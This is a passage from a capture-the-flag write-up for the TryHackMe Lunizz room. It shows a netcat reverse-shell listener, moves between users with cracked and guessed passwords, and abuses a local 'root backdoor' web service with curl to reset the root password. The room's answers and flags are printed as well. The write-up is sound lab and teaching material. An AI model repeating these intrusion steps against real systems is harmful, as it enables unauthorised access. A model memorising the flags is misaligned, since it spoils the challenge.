Attempt to crack with password: bowwow, its hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
Found valid password: bowwow
```

switching to adam :

```jsx
┌──(akhilbangaru🤓akhilbangaru)-[~/THM/Lunizz-CTF]
└─$ nc -nlvp 1111
listening on [any] 1111 ...
connect to [192.168.161.236] from (UNKNOWN) [10.48.149.190] 33688
bash: cannot set terminal process group (851): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-48-149-190:/var/www/html/whatever$ su adam
su adam
Password: bowwow
whoami
adam
```

finding files owned by adam :

since we get so many proc files we use :

```jsx
find / -user adam 2>/dev/null | grep -v "/proc"
```

output :

```jsx
/run/user/1000
/run/user/1000/snapd-session-agent.socket
/run/user/1000/pk-debconf-socket
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/bus
/run/user/1000/systemd
/run/user/1000/systemd/private
/run/user/1000/systemd/notify
/run/user/1000/systemd/units
/run/user/1000/systemd/units/invocation:dbus.socket
/run/user/1000/inaccessible
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/tasks
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/notify_on_release
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.events
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/io.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.procs
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.max.descendants
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cpu.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/memory.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cpu.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.type
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.threads
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.kill
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.freeze
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.controllers
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.subtree_control
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket/cgroup.max.depth
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.threads
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.events
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/io.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.descendants
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/memory.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cpu.pressure
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.type
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.stat
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.threads
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.kill
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.freeze
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.controllers
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.subtree_control
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.max.depth
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/cgroup.subtree_control
/home/adam
/home/adam/Desktop
/home/adam/Desktop/.archive
/home/adam/Desktop/.archive/to_my_best_friend_adam.txt
/home/adam/Downloads
/home/adam/.bashrc
/home/adam/.bash_logout
/home/adam/.profile
```

we see this /home/adam/Desktop/.archive/to_my_best_friend_adam.txt :

```jsx
cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
```

we go to that link :

![image.png](image%205.png)

we use northernlights as the password

Q4.hi adam, do you remember our place?

Answer : northernlights

credentials : mason:northernlights

loggin in as mason :

```jsx
su mason
Password: northernlights
ls
config.php
index.php
whoami
mason
find / -name "user.txt" 2>dev/null
sh: 3: cannot create dev/null: Directory nonexistent
ls
config.php
index.php
find / -name "user.txt" 2>/dev/null
/home/mason/user.txt
ls
config.php
index.php
```

Q5.user.txt

Answer: thm{23cd53cbb37a37a74d4425b703d91883}

```jsx
cat /home/mason/user.txt
thm{23cd53cbb37a37a74d4425b703d91883}
```

finding the services running locally on the vm :

```jsx
ss -telnet
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         151                0.0.0.0:3306             0.0.0.0:*        uid:111 ino:30844 sk:4 <->                                                     
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        ino:28279 sk:5 <->                                                             
LISTEN    0         5                  0.0.0.0:4444             0.0.0.0:*        uid:1001 ino:28325 sk:6 <->                                                    
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*        uid:101 ino:23388 sk:7 <->                                                     
LISTEN    0         4096             127.0.0.1:8080             0.0.0.0:*        ino:29002 sk:8 <->                                                             
LISTEN    0         5                  0.0.0.0:5000             0.0.0.0:*        uid:1001 ino:28323 sk:9 <->                                                    
LISTEN    0         128                   [::]:22                  [::]:*        ino:28300 sk:a v6only:1 <->                                                    
LISTEN    0         511                      *:80                     *:*        ino:28960 sk:b v6only:0 <->                                                    
LISTEN    0         70                       *:33060                  *:*        uid:111 ino:29791 sk:c v6only:0 <-> 
```

127.0.0.1 —> interesting one

```jsx
curl 127.0.0.1:8080
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   410    0   410    0     0   400k      0 --:--:-- --:--:-- --:--:--  400k
**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

this is how you get root

```jsx
curl http://127.0.0.1:8080 -X POST -d 'password=northernlights&cmdtype=passwd'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   491    0   453  100    38  28312   2375 --:--:-- --:--:-- --:--:-- 32733
<br>Password Changed To :northernlights<br>**********************************************************
*                Mason's Root Backdoor                   *
*                                                        *
*   Please Send Request (with "password" and "cmdtype")  *
*                                                        *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```

by using passwd we have changed the password of root to northernlights

switching to root :

```jsx
su root
Password: northernlights
id
uid=0(root) gid=0(root) groups=0(root)
```

Q6.root.txt 

Answer : thm{ad23b9c63602960371b50c7a697265db}

```jsx
cd /
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
proct
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
index.php
r00t.txt
snap
cat r00t.txt
thm{ad23b9c63602960371b50c7a697265db}
```